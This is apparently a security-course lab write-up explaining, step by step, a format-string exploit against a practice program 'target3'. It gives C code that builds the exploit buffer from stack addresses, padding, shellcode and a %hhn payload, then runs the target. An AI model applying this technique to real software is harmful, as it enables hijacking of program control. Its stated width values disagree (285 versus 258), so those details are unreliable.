Target3 has format string Vulnerability. By writing a specific format string
in arg parameter of foo function we can force this program to overwrite return
address with an address that we want, so after foo the program will return on an
address that we want.

The format string should follow this pattern:
<address>ZZZZ<address+1>ZZZZ<address+2>ZZZZ<address+3><Shellcode>%8x...%8x%<len1>x%hhn%<len2>x%hhn%<len3>x%hhn%<len4>x%hhn

<address> is the address of "return Address" in the stack. %hhn will overwrite
LSB byte of this address by the number of bytes that snprintf has printed
until now. Therefore, we choose <len1> as a value that will overwrite on LSB
byte of "Return Address" on the stack to become equal to two LSB byte of
shellcode's address. As a same way, we choose <len2> as a value that LSB of 
<address+1> (which is 2nd byte of "return Address" on the stack) become equal 
to 2nd byte of the address of our shellcode. Until now we have overwritten 
two LSB of "Return Address", in a similar way we choose <len3> and <len4> 
to overwrite rest two bytes of "Return Address". So, in this way we overwrote 
"Return Address" to address of our shellcode.

The number of %8x after shellcode is very important. We should check various
number of %8x to find how many of them in required to be sure that %hhn will
overwrite data on correct address.
---------------------------------------------------------------------------
Size of input of snprintf in foo function is limited to 116 byte, so we set
size of arg1 to 116.

	char arg1[116];

We must first write <address> in little endian format on arg1. First %hhn will
read this address and will overwrite first byte of place that it refer to (1st 
byte of Return Address) by the number of bytes that have been printed until now
that is equal to <something+len1>

	strcpy(arg1,   "\x64\xfd\xff\xbe");

We must write four arbitrary character to be used by %<len1>x

	strcpy(arg1+4, "ZZZZ");

Next we must write <address+1> in little endian format. Second %hhn will read 
this address and will overwrite first byte of place that it refer to (2nd 
byte of Return Address) by the number of bytes that have been printed until 
now that is equal to <something+len2>

	strcpy(arg1+8, "\x65\xfd\xff\xbe"); 

We must write four arbitrary character to be used by %<len2>x

	strcpy(arg1+12, "ZZZZ");

After that we must write <address+2> in little endian format. Third %hhn will
read this address and will overwrite first byte of place that it refer to 
(3rd byte of Return Address) by the number of bytes that have been printed 
until now that is equal to <something+len3>

	strcpy(arg1+16, "\x66\xfd\xff\xbe"); 

We must write four arbitrary character to be used by %<len3>x

	strcpy(arg1+20, "ZZZZ"); 

Next we must write <address+3> in little endian format. fourth %hhn will read 
this address and will overwrite first byte of place that it refer to (4rd 
byte of Return Address) by the number of bytes that have been printed until 
now that is equal to <something+len4>

	strcpy(arg1+24, "\x67\xfd\xff\xbe");

After that we write our shellcode on the arg1.

	strcpy(arg1+28, shellcode);

Empirically We found that we need only on %08x. Also, we found that value of
<len1>, <len2>, <len3>, and <len4> should be 191, 245, 285, and 191
respectively. So, our payload will be like this:

	char * payload = "%08x%191x%hhn%245x%hhn%258x%hhn%191x%hhn";

We write payload on arg1.

	strcat(arg1, payload);

We put a NULL byte at the end of our arg to say that our string has been
finished.

	strcat(arg1, "\x00");

Finally, we will execute target3 and use arg1 as its input.

	if(0>execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

